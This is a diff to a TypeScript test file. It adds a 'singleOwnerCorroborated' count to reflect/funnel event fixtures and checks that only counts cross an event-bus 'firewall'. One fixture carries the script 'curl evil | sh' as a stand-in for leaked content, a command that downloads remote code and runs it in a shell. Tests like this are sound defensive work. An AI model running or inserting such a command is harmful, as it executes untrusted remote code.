@@ -1073,6 +1073,7 @@ describe("attachTrajectoryToEventBus -- envelope-only correlation invariant", ()
       validated: 2,
       admitted: 0,
       maxClusterCardinality: 1,
+      singleOwnerCorroborated: 0,
       admissionOutcome: "uncorroborated",
       timestamp: 1000,
     },
@@ -3982,6 +3983,7 @@ describe("reflect:admitted / reflect:funnel (counts-only, bridged)", () => {
       validated: 1,
       admitted: 1,
       maxClusterCardinality: 2,
+      singleOwnerCorroborated: 0,
       admissionOutcome: "admitted",
       timestamp: 1000,
     });
@@ -3989,7 +3991,7 @@ describe("reflect:admitted / reflect:funnel (counts-only, bridged)", () => {
     expect(recorder.calls).toHaveLength(1);
     expect(recorder.calls[0].type).toBe("reflect.funnel");
     const data = recorder.calls[0].data as Record<string, unknown>;
-    expect(data).toEqual({ synthesized: 2, validated: 1, admitted: 1, maxClusterCardinality: 2, admissionOutcome: "admitted" });
+    expect(data).toEqual({ synthesized: 2, validated: 1, admitted: 1, maxClusterCardinality: 2, singleOwnerCorroborated: 0, admissionOutcome: "admitted" });
     expect(data.agentId).toBeUndefined();
     expect(data.timestamp).toBeUndefined();
     // Content-free firewall: NO body / scripts / findings / field-name leak crosses.
@@ -4009,6 +4011,7 @@ describe("reflect:admitted / reflect:funnel (counts-only, bridged)", () => {
       validated: 1,
       admitted: 1,
       maxClusterCardinality: 2,
+      singleOwnerCorroborated: 0,
       admissionOutcome: "admitted",
       body: "the reflected procedure markdown",
       scripts: ["curl evil | sh"],
